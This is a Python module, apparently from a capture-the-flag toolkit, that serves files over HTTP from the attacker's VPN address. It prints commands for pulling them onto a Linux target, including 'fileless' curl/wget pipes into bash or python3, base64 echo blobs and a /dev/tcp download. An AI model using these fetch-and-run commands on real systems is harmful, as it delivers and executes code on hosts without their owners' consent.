import base64
import http.server
import os
import socket
import socketserver
import tarfile
import tempfile
import threading

from pathlib import Path


# =========================================================
# COLORS
# =========================================================

G = '\033[92m'
C = '\033[96m'
B = '\033[94m'
Y = '\033[93m'
R = '\033[91m'
W = '\033[0m'
M = '\033[35m'
W_BOLD = '\033[1m'


# =========================================================
# HELPERS
# =========================================================

def detect_ip():

    try:

        import netifaces

        if "tun0" in netifaces.interfaces():

            iface = netifaces.ifaddresses("tun0")

            if netifaces.AF_INET in iface:

                return iface[netifaces.AF_INET][0]["addr"]

    except Exception:
        pass

    try:

        s = socket.socket(
            socket.AF_INET,
            socket.SOCK_DGRAM
        )

        s.connect(("1.1.1.1", 80))

        ip = s.getsockname()[0]

        s.close()

        return ip

    except Exception:

        return "127.0.0.1"


def copy_clipboard(text):

    try:

        import pyperclip

        pyperclip.copy(text)

        return True

    except Exception:

        return False


# =========================================================
# TAR DIRECTORY
# =========================================================

def prepare_file(path):

    path = Path(path).resolve()

    if path.is_file():
        return path

    temp_dir = Path(
        tempfile.gettempdir()
    )

    archive = (
        temp_dir /
        f"{path.name}.tar.gz"
    )

    with tarfile.open(
        archive,
        "w:gz"
    ) as tar:

        tar.add(
            path,
            arcname=path.name
        )

    return archive


# =========================================================
# HTTP SERVER
# =========================================================

def serve_http(directory, port=8080):

    directory = Path(directory).resolve()

    os.chdir(directory)

    handler = (
        http.server.SimpleHTTPRequestHandler
    )

    class ReusableTCPServer(
        socketserver.TCPServer
    ):
        allow_reuse_address = True

    httpd = ReusableTCPServer(
        ("0.0.0.0", port),
        handler
    )

    thread = threading.Thread(
        target=httpd.serve_forever,
        daemon=True
    )

    thread.start()

    return httpd


# =========================================================
# COMMAND BUILDERS
# =========================================================

def build_http_commands(
    ip,
    port,
    filename
):

    return {
        "curl":
            f"curl -O http://{ip}:{port}/{filename}",

        "wget":
            f"wget http://{ip}:{port}/{filename}",
    }


def build_fileless_commands(
    ip,
    port,
    filename
):

    if filename.endswith(".sh"):

        return {
            "curl":
                f"curl -s http://{ip}:{port}/{filename} | bash",

            "wget":
                f"wget -qO- http://{ip}:{port}/{filename} | bash",
        }

    elif filename.endswith(".py"):

        return {
            "curl":
                f"curl -s http://{ip}:{port}/{filename} | python3",

            "wget":
                f"wget -qO- http://{ip}:{port}/{filename} | python3",
        }

    return None


def build_offline_command(filepath):

    data = Path(
        filepath
    ).read_bytes()

    encoded = (
        base64
        .b64encode(data)
        .decode()
    )

    filename = (
        Path(filepath)
        .name
    )

    return (
        f"echo '{encoded}' "
        f"| base64 -d > {filename}"
    )


def build_bash_tcp_command(
    ip,
    port,
    filename
):

    return (
        f"exec 3<>/dev/tcp/{ip}/{port}; "
        f"echo -e "
        f"'GET /{filename} HTTP/1.1\\r\\n"
        f"Host: {ip}:{port}\\r\\n"
        f"Connection: close\\r\\n\\r\\n' >&3; "
        f"awk 'BEGIN{{RS=\"\\r\\n\\r\\n\"}} "
        f"NR==2{{print > \"{filename}\"}}' <&3"
    )


# =========================================================
# MODES
# =========================================================

def mode_http(
    files,
    ip,
    port
):

    print(
        f"\n{M}=== HTTP ==={W}\n"
    )

    clipboard = []

    for filepath in files:

        filename = (
            Path(filepath)
            .name
        )

        cmds = build_http_commands(
            ip,
            port,
            filename
        )

        print(
            f"{C}{filename}{W}\n"
        )

        for name, cmd in cmds.items():

            print(
                f"{B}[{name}]{W}"
            )

            print(cmd)
            print()

        clipboard.append(
            cmds["curl"]
        )

    copy_clipboard(
        "\n".join(clipboard)
    )

    print(
        f"{G}→ helpers copied to clipboard{W}"
    )

    directory = (
        Path(files[0])
        .parent
    )

    print(
        f"\n{Y}[*] Serving "
        f"{len(files)} file(s) "
        f"at http://{ip}:{port}/{W}"
    )

    return serve_http(
        directory,
        port
    )


def mode_fileless(
    filepath,
    ip,
    port
):

    filename = (
        Path(filepath)
        .name
    )

    cmds = build_fileless_commands(
        ip,
        port,
        filename
    )

    if not cmds:

        print(
            f"\n{R}[!] Unsupported file type{W}"
        )

        return

    print(
        f"\n{M}=== FILELESS ==={W}\n"
    )

    for name, cmd in cmds.items():

        print(
            f"{B}[{name}]{W}"
        )

        print(cmd)
        print()

    copy_clipboard(
        cmds["curl"]
    )

    print(
        f"{G}→ helper copied to clipboard{W}"
    )

    print(
        f"\n{Y}[*] Serving {filename} "
        f"at http://{ip}:{port}/{W}"
    )

    return serve_http(
        Path(filepath).parent,
        port
    )


def mode_offline(files):

    print(
        f"\n{M}=== OFFLINE ==={W}\n"
    )

    clipboard = []

    for filepath in files:

        cmd = build_offline_command(
            filepath
        )

        print(
            f"{C}{Path(filepath).name}{W}\n"
        )

        print(cmd)
        print()

        clipboard.append(cmd)

    copy_clipboard(
        "\n\n".join(clipboard)
    )

    print(
        f"{G}→ helpers copied to clipboard{W}"
    )


def mode_bash(
    files,
    ip,
    port
):

    print(
        f"\n{M}=== BASH TCP ==={W}\n"
    )

    clipboard = []

    for filepath in files:

        filename = (
            Path(filepath)
            .name
        )

        cmd = build_bash_tcp_command(
            ip,
            port,
            filename
        )

        print(
            f"{C}{filename}{W}\n"
        )

        print(cmd)
        print()

        clipboard.append(cmd)

    copy_clipboard(
        "\n".join(clipboard)
    )

    print(
        f"{G}→ helpers copied to clipboard{W}"
    )

    return serve_http(
        Path(files[0]).parent,
        port
    )


# =========================================================
# MENU
# =========================================================

def choose_mode():

    print(
        f"\n{W_BOLD}"
        f"[*] LINUX FILE DELIVERY"
        f"{W}"
    )

    print(
        f"\n  {B}[1]{W} HTTP"
    )

    print(
        f"  {B}[2]{W} Fileless"
    )

    print(
        f"  {B}[3]{W} Offline Base64"
    )

    print(
        f"  {B}[4]{W} Bash TCP"
    )

    print()

    choice = input(
        f"{B}select{W}> "
    ).strip()

    return {
        "1": "http",
        "2": "fileless",
        "3": "offline",
        "4": "bash",
    }.get(choice)


# =========================================================
# PUBLIC API
# =========================================================

def stage_linux_files(
    files,
    method=None,
    ip=None,
    port=8080,
):

    files = [
        prepare_file(f)
        for f in files
    ]

    for filepath in files:

        if not Path(filepath).exists():

            print(
                f"\n{R}[!] File not found:{W}"
            )

            print(
                f"  {filepath}"
            )

            return

    if not ip:
        ip = detect_ip()

    if not method:
        method = choose_mode()

    if not method:
        return

    if method == "http":

        server = mode_http(
            files,
            ip,
            port
        )

        try:
            input(
                "\nPress ENTER to stop server...\n"
            )
        finally:
            server.shutdown()

    elif method == "fileless":

        if len(files) != 1:

            print(
                f"\n{R}[!] "
                f"Fileless only supports one file{W}"
            )

            return

        server = mode_fileless(
            files[0],
            ip,
            port
        )

        try:
            input(
                "\nPress ENTER to stop server...\n"
            )
        finally:
            server.shutdown()

    elif method == "offline":

        mode_offline(files)

    elif method == "bash":

        server = mode_bash(
            files,
            ip,
            port
        )

        try:
            input(
                "\nPress ENTER to stop server...\n"
            )
        finally:
            server.shutdown()


def stage_linux_file(
    filepath,
    method=None,
    ip=None,
    port=8080,
):

    return stage_linux_files(
        [filepath],
        method,
        ip,
        port
    )


def run(data=None, cred=None, args=None):

    files = []

    arg_files = getattr(
        args,
        "files",
        None
    )

    if arg_files:

        if isinstance(
            arg_files,
            str
        ):
            files.append(
                arg_files
            )

        else:
            files.extend(
                arg_files
            )

    arg_file = getattr(
        args,
        "file",
        None
    )

    if arg_file:
        files.append(
            arg_file
        )

    if not files:

        print(
            f"\n{R}[!] Usage:{W} "
            f"ctf upload.linux <file>"
        )

        return data

    files = list(
        dict.fromkeys(files)
    )

    stage_linux_files(files)

    return data
